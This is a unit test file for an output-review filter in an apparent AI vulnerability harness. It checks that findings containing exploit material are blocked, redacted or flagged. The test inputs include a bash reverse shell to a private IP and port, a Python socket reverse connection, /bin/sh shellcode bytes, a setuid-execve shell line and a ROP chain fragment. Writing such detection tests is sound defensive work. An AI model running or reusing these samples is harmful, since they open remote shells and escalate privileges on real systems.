"""Tests for stages/output_review.py — output content review gate."""

import unittest

from ai_vuln_harness.stages.output_review import (
    ReviewAction,
    review_content,
    review_finding,
    review_findings,
)


class ReviewContentTests(unittest.TestCase):
    """Tests for review_content() pattern detection."""

    # --- BLOCK tier ---

    def test_block_shellcode_bytes(self):
        r = review_content(r"char buf[] = \x31\xc0\x50\x68\x2f\x2f\x73\x68")
        self.assertEqual(r.action, ReviewAction.BLOCK)
        self.assertTrue(r.blocked)

    def test_block_reverse_shell(self):
        r = review_content("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        self.assertEqual(r.action, ReviewAction.BLOCK)

    def test_block_rop_chain(self):
        r = review_content("rop = [pop_rdi, pop_rsi, ret_gadget, system_addr]")
        self.assertEqual(r.action, ReviewAction.BLOCK)

    def test_block_setuid_shell(self):
        r = review_content("setuid(0); execve('/bin/sh', NULL, NULL);")
        self.assertEqual(r.action, ReviewAction.BLOCK)

    def test_block_socket_reverse(self):
        r = review_content("Socket(AF_INET, SOCK_STREAM).connect(('10.0.0.1', 4444))")
        self.assertEqual(r.action, ReviewAction.BLOCK)

    # --- REDACT tier ---

    def test_redact_memory_address(self):
        r = review_content("libc_base = 0x7ffff7a00000")
        self.assertEqual(r.action, ReviewAction.REDACT)
        self.assertTrue(r.redacted)
        self.assertIn("[REDACTED]", r.redacted_content)

    def test_redact_proc_mem(self):
        r = review_content("read('/proc/self/mem', offset)")
        self.assertEqual(r.action, ReviewAction.REDACT)

    def test_redact_asan_address(self):
        r = review_content("ASAN: WRITE of size 8 at 0x602000000010")
        self.assertEqual(r.action, ReviewAction.REDACT)

    # --- WARN tier ---

    def test_warn_exploit_terminology(self):
        r = review_content("This finding describes an exploit chain")
        self.assertEqual(r.action, ReviewAction.WARN)

    def test_warn_memory_corruption(self):
        r = review_content("Buffer overflow corruption detected")
        self.assertEqual(r.action, ReviewAction.WARN)

    def test_warn_privilege_escalation(self):
        r = review_content("Potential privilege escalation via sudo")
        self.assertEqual(r.action, ReviewAction.WARN)

    def test_warn_network_in_poc(self):
        r = review_content("requests.get('http://example.com')")
        self.assertEqual(r.action, ReviewAction.WARN)

    # --- PASS ---

    def test_pass_clean_content(self):
        r = review_content("SQL injection vulnerability in login query")
        self.assertEqual(r.action, ReviewAction.PASS)

    def test_pass_empty_content(self):
        r = review_content("")
        self.assertEqual(r.action, ReviewAction.PASS)

    def test_pass_short_content(self):
        r = review_content("OK")
        self.assertEqual(r.action, ReviewAction.PASS)

    # --- Strict mode ---

    def test_strict_blocks_warn_patterns(self):
        r = review_content("Buffer overflow detected", risk_level="strict")
        self.assertEqual(r.action, ReviewAction.BLOCK)

    def test_standard_allows_warn_patterns(self):
        r = review_content("Buffer overflow detected", risk_level="standard")
        self.assertEqual(r.action, ReviewAction.WARN)


class ReviewFindingTests(unittest.TestCase):
    """Tests for review_finding() on complete finding dicts."""

    def test_clean_finding_passes(self):
        f = {"desc": "SQL injection in login", "snippet_id": "s1"}
        r = review_finding(f)
        self.assertEqual(r.action, ReviewAction.PASS)

    def test_poc_source_with_shellcode_blocked(self):
        f = {
            "desc": "Buffer overflow",
            "poc_source": r"char shellcode[] = \x31\xc0\x50\x68\x2f\x2f\x73\x68",
        }
        r = review_finding(f)
        self.assertEqual(r.action, ReviewAction.BLOCK)

    def test_exploit_code_blocked(self):
        f = {
            "desc": "Memory corruption",
            "exploit_code": "setuid(0); execve('/bin/sh', NULL, NULL);",
        }
        r = review_finding(f)
        self.assertEqual(r.action, ReviewAction.BLOCK)

    def test_desc_with_address_redacted(self):
        f = {"desc": "libc_base = 0x7ffff7a00000 leaked via format string"}
        r = review_finding(f)
        self.assertEqual(r.action, ReviewAction.REDACT)

    def test_multiple_fields_worst_action_wins(self):
        f = {
            "desc": "Buffer overflow (warn)",
            "poc_source": "setuid(0); execve('/bin/sh');",  # block
        }
        r = review_finding(f)
        self.assertEqual(r.action, ReviewAction.BLOCK)


class ReviewFindingsTests(unittest.TestCase):
    """Tests for review_findings() batch processing."""

    def test_all_clean(self):
        findings = [
            {"desc": "SQL injection", "snippet_id": "s1"},
            {"desc": "XSS in template", "snippet_id": "s2"},
        ]
        passed, blocked = review_findings(findings)
        self.assertEqual(len(passed), 2)
        self.assertEqual(len(blocked), 0)

    def test_one_blocked(self):
        findings = [
            {"desc": "SQL injection", "snippet_id": "s1"},
            {"desc": "Buffer overflow", "poc_source": "setuid(0); execve('/bin/sh');", "snippet_id": "s2"},
        ]
        passed, blocked = review_findings(findings)
        self.assertEqual(len(passed), 1)
        self.assertEqual(len(blocked), 1)
        self.assertEqual(blocked[0]["review_action"], "block")
        self.assertIn("review_findings", blocked[0])

    def test_annotated_with_action(self):
        findings = [{"desc": "Clean finding", "snippet_id": "s1"}]
        passed, _ = review_findings(findings)
        self.assertEqual(passed[0]["review_action"], "pass")

    def test_redacted_findings_still_pass(self):
        findings = [{"desc": "libc_base = 0x7ffff7a00000", "snippet_id": "s1"}]
        passed, blocked = review_findings(findings)
        self.assertEqual(len(passed), 1)
        self.assertEqual(len(blocked), 0)
        self.assertEqual(passed[0]["review_action"], "redact")
        self.assertIn("[REDACTED]", passed[0]["desc"])

    def test_empty_findings(self):
        passed, blocked = review_findings([])
        self.assertEqual(passed, [])
        self.assertEqual(blocked, [])


if __name__ == "__main__":
    unittest.main()
